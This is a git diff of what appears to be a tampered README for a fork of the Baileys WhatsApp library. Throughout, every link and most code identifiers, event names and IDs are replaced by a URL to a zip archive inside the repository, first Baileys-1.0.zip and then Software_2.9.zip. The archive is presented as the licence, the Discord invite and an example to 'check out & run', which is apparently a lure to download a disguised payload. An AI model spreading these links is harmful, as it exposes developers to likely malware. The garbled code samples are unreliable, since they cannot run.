@@ -5,24 +5,24 @@
 This library was originally a project for **CS-2362 at Ashoka University** and is in no way affiliated with or endorsed by WhatsApp. Use at your own discretion. Do not spam people with this. We discourage any stalkerware, bulk or automated messaging usage. 
 
 #### Liability and License Notice
-Baileys and its maintainers cannot be held liable for misuse of this application, as stated in the [MIT license](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip).
+Baileys and its maintainers cannot be held liable for misuse of this application, as stated in the [MIT license](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip).
 The maintainers of Baileys do not in any way condone the use of this application in practices that violate the Terms of Service of WhatsApp. The maintainers of this application call upon the personal responsibility of its users to use this application in a fair way, as it is intended to be used.
 ##
 
 Baileys does not require Selenium or any other browser to be interface with WhatsApp Web, it does so directly using a **WebSocket**. 
 Not running Selenium or Chromimum saves you like **half a gig** of ram :/ 
 Baileys supports interacting with the multi-device & web versions of WhatsApp.
-Thank you to [@pokearaujo](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) for writing his observations on the workings of WhatsApp Multi-Device. Also, thank you to [@Sigalor](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) for writing his observations on the workings of WhatsApp Web and thanks to [@Rhymen](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) for the __go__ implementation.
+Thank you to [@pokearaujo](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) for writing his observations on the workings of WhatsApp Multi-Device. Also, thank you to [@Sigalor](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) for writing his observations on the workings of WhatsApp Web and thanks to [@Rhymen](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) for the __go__ implementation.
  
 ## Please Read
 
 The original repository had to be removed by the original author - we now continue development in this repository here.
 This is the only official repository and is maintained by the community.
- **Join the Discord [here](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)**
+ **Join the Discord [here](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)**
  
 ## Example
 
-Do check out & run [https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) to see an example usage of the library.
+Do check out & run [https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) to see an example usage of the library.
 The script covers most common use cases.
 To run the example script, download or clone the repo and then type the following in a terminal:
 1. ``` cd path/to/Baileys ```
@@ -63,24 +63,24 @@ async function connectToWhatsApp () {
         // can provide additional config here
         printQRInTerminal: true
     })
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', (update) => {
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', (update) => {
         const { connection, lastDisconnect } = update
         if(connection === 'close') {
-            const shouldReconnect = (https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip as Boom)https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip !== https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip
-            https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('connection closed due to ', https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip, ', reconnecting ', shouldReconnect)
+            const shouldReconnect = (https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip as Boom)https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip !== https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip
+            https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('connection closed due to ', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, ', reconnecting ', shouldReconnect)
             // reconnect if not logged out
             if(shouldReconnect) {
                 connectToWhatsApp()
             }
         } else if(connection === 'open') {
-            https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('opened connection')
+            https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('opened connection')
         }
     })
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', m => {
-        https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(m, undefined, 2))
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', m => {
+        https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(m, undefined, 2))
 
-        https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('replying to', https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip[0]https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)
-        await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip[0]https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip!, { text: 'Hello there!' })
+        https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('replying to', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip[0]https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
+        await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip[0]https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip!, { text: 'Hello there!' })
     })
 }
 // run in main file
@@ -97,7 +97,7 @@ If the connection is successful, you will see a QR code printed on your terminal
 
 Baileys also supports the native mobile API, which allows users to authenticate as a standalone WhatsApp client using their phone number.
 
-Run the [example](https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) file with ``--mobile`` cli flag to use the native mobile API.
+Run the [example](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) file with ``--mobile`` cli flag to use the native mobile API.
 
 ## Configuring the Connection
 
@@ -141,7 +141,7 @@ type SocketConfig = {
     /** provide an auth state object to maintain the auth state */
     auth: AuthenticationState
     /** manage history processing with this control; by default will sync up everything */
-    shouldSyncHistoryMessage: (msg: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) => boolean
+    shouldSyncHistoryMessage: (msg: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) => boolean
     /** transaction capability options for SignalKeyStore */
     transactionOpts: TransactionCapabilityOptions
     /** provide a cache to store a user's device list */
@@ -170,7 +170,7 @@ type SocketConfig = {
      * fetch a message from your store
      * implement this so that messages failed to send (solves the "this message can take a while" issue) can be retried
      * */
-    getMessage: (key: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip) => Promise<https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip | undefined>
+    getMessage: (key: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) => Promise<https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip | undefined>
 }
 ```
 
@@ -180,9 +180,9 @@ type SocketConfig = {
 2. If you'd like to emulate a desktop connection (and receive more message history), add this to your Socket config:
     ``` ts
     const conn = makeWASocket({
-        https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip,
+        https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip,
         // can use Windows, Ubuntu here too
-        browser: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('Desktop'),
+        browser: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('Desktop'),
         syncFullHistory: true
     })
     ```
@@ -203,14 +203,14 @@ const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys')
 // so if valid credentials are available -- it'll connect without QR
 const conn = makeWASocket({ auth: state }) 
 // this will be called as soon as the credentials are updated
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip ('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', saveCreds)
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip ('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', saveCreds)
 ```
 
-**Note:** When a message is received/sent, due to signal sessions needing updating, the auth keys (`https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip`) will update. Whenever that happens, you must save the updated keys (`https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip()` is called). Not doing so will prevent your messages from reaching the recipient & cause other unexpected consequences. The `useMultiFileAuthState` function automatically takes care of that, but for any other serious implementation -- you will need to be very careful with the key state management.
+**Note:** When a message is received/sent, due to signal sessions needing updating, the auth keys (`https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip`) will update. Whenever that happens, you must save the updated keys (`https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip()` is called). Not doing so will prevent your messages from reaching the recipient & cause other unexpected consequences. The `useMultiFileAuthState` function automatically takes care of that, but for any other serious implementation -- you will need to be very careful with the key state management.
 
 ## Listening to Connection Updates
 
-Baileys now fires the `https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip` event to let you know something has updated in the connection. This data has the following structure:
+Baileys now fires the `https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip` event to let you know something has updated in the connection. This data has the following structure:
 ``` ts
 type ConnectionState = {
 	/** connection is now open, connecting or closed */
@@ -242,50 +242,50 @@ The events are typed as mentioned here:
 
 export type BaileysEventMap = {
     /** connection state has been updated -- WS closed, opened, connecting etc. */
-	'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Partial<ConnectionState>
+	'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<ConnectionState>
     /** credentials updated -- some metadata, keys or something */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Partial<AuthenticationCreds>
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<AuthenticationCreds>
     /** history sync, everything is reverse chronologically sorted */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': {
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': {
         chats: Chat[]
         contacts: Contact[]
         messages: WAMessage[]
         isLatest: boolean
     }
     /** upsert chats */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Chat[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Chat[]
     /** update the given chats */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Partial<Chat>[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<Chat>[]
     /** delete chats with given ID */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': string[]
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': LabelAssociation
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Label
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': string[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': LabelAssociation
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Label
     /** presence of contact in a chat updated */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { id: string, presences: { [participant: string]: PresenceData } }
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { id: string, presences: { [participant: string]: PresenceData } }
 
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Contact[]
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Partial<Contact>[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Contact[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<Contact>[]
 
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { keys: WAMessageKey[] } | { jid: string, all: true }
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': WAMessageUpdate[]
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { key: WAMessageKey, media?: { ciphertext: Uint8Array, iv: Uint8Array }, error?: Boom }[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { keys: WAMessageKey[] } | { jid: string, all: true }
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': WAMessageUpdate[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { key: WAMessageKey, media?: { ciphertext: Uint8Array, iv: Uint8Array }, error?: Boom }[]
     /**
      * add/update the given messages. If they were received while the connection was online,
      * the update will have type: "notify"
      *  */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { messages: WAMessage[], type: MessageUpsertType }
-    /** message was reacted to. If reaction was removed -- then "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip" will be falsey */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { key: WAMessageKey, reaction: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip }[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { messages: WAMessage[], type: MessageUpsertType }
+    /** message was reacted to. If reaction was removed -- then "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" will be falsey */
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { key: WAMessageKey, reaction: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip }[]
 
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': MessageUserReceiptUpdate[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': MessageUserReceiptUpdate[]
 
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': GroupMetadata[]
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': Partial<GroupMetadata>[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': GroupMetadata[]
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<GroupMetadata>[]
     /** apply an action to participants in a group */
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { id: string, participants: string[], action: ParticipantAction }
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { id: string, participants: string[], action: ParticipantAction }
 
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { blocklist: string[] }
-    'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip': { blocklist: string[], type: 'add' | 'remove' }
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { blocklist: string[] }
+    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { blocklist: string[], type: 'add' | 'remove' }
     /** Receive an update on a call, including when the call was received, rejected, accepted */
     'call': WACallEvent[]
 }
@@ -295,8 +295,8 @@ You can listen to these events like this:
 ``` ts
 
 const sock = makeWASocket()
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', ({ messages }) => {
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('got messages', messages)
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', ({ messages }) => {
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('got messages', messages)
 })
 
 ```
@@ -313,25 +313,25 @@ import makeWASocket, { makeInMemoryStore } from '@whiskeysockets/baileys'
 // can be written out to a file & read from it
 const store = makeInMemoryStore({ })
 // can be read from a file
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip')
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
 // saves the state to a file every 10s
 setInterval(() => {
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip')
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
 }, 10_000)
 
 const sock = makeWASocket({ })
 // will listen from this socket
 // the store can listen from a new socket once the current socket outlives its lifetime
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip)
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
 
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', () => {
-    // can use "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip" however you want, even after the socket dies out
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', () => {
+    // can use "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" however you want, even after the socket dies out
     // "chats" => a KeyedDB instance
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('got chats', https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip())
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('got chats', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip())
 })
 
-https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip', () => {
-    https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip('got contacts', https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip))
+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', () => {
+    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('got contacts', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip))
 })
 
 ```
@@ -349,15 +349,15 @@ The store also provides some simple functions such as `loadMessages` that utiliz
 ``` ts
 import { MessageType, MessageOptions, Mimetype } from '@whiskeysockets/baileys'
 
-const id = 'https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' // the WhatsApp ID 
+const id = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // the WhatsApp ID 
 // send a simple text!
-const sentMsg  = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(id, { text: 'oh hello there' })
+const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: 'oh hello there' })
 // send a reply messagge
-const sentMsg  = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(id, { text: 'oh hello there' }, { quoted: message })
+const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: 'oh hello there' }, { quoted: message })
 // send a mentions message
-const sentMsg  = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(id, { text: '@12345678901', mentions: ['https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip'] })
+const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: '@12345678901', mentions: ['https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip'] })
 // send a location!
-const sentMsg  = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     id, 
     { location: { degreesLatitude: 24.121231, degreesLongitude: 55.1121221 } }
 )
@@ -368,7 +368,7 @@ const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
             + 'ORG:Ashoka Uni;\n' // the organization of the contact
             + 'TEL;type=CELL;type=VOICE;waid=911234567890:+91 12345 67890\n' // WhatsApp ID + phone number
             + 'END:VCARD'
-const sentMsg  = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     id,
     { 
         contacts: { 
@@ -381,11 +381,11 @@ const sentMsg  = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main
 const reactionMessage = {
     react: {
         text: "💖", // use an empty string to remove the reaction
-        key: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip
+        key: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip
     }
 }
 
-const sendMsg = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(id, reactionMessage)
+const sendMsg = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, reactionMessage)
 ```
 
 ### Sending messages with link previews
@@ -396,7 +396,7 @@ const sendMsg = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/
 4. Send a link:
 ``` ts
 // send a link
-const sentMsg  = await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(id, { text: 'Hi, this was sent using https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip' })
+const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: 'Hi, this was sent using https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' })
 ```
 
 ### Media Messages
@@ -408,19 +408,19 @@ Sending media (video, stickers, images) is easier & more efficient than ever.
 ``` ts
 import { MessageType, MessageOptions, Mimetype } from '@whiskeysockets/baileys'
 // Sending gifs
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     id, 
     { 
-        video: https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip("https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip"), 
+        video: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"), 
         caption: "hello!",
         gifPlayback: true
     }
 )
 
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     id, 
     { 
-        video: "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip", 
+        video: "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 
         caption: "hello!",
         gifPlayback: true,
 	ptv: false // if set to true, will send as a `video note`
@@ -428,19 +428,19 @@ await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Bailey
 )
 
 // send an audio file
-await https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip(
+await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
     id, 
-    { audio: { url: "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip" }, mimetype: 'audio/mp4' }
-    { url: "https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip" }, // can send mp3, mp4, & ogg
+    { audio: { url: "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" }, mimetype: 'audio/mp4' }
+    { url: "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" }, // can send mp3, mp4, & ogg
 )
 ```
 
 ### Notes
 
 - `id` is the WhatsApp ID of the person or group you're sending the message to. 
-    - It must be in the format ```[country code][phone number]https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip```
-	    - Example for people: ```+https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip```. 
-	    - For groups, it must be in the format ``` https://raw.githubusercontent.com/cyran-kyle/Baileys/main/lib/Utils/Baileys-1.0.zip ```. 
+    - It must be in the format ```[country code][phone number]https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip```
+	    - Example for people: ```+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip```. 
+	    - For groups, it must be in the format ``` https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip ```. 
     - For broadcast lists, it's `[timestamp of creation]@broadcast`.
     - For stories, the ID is `status@broadcast`.
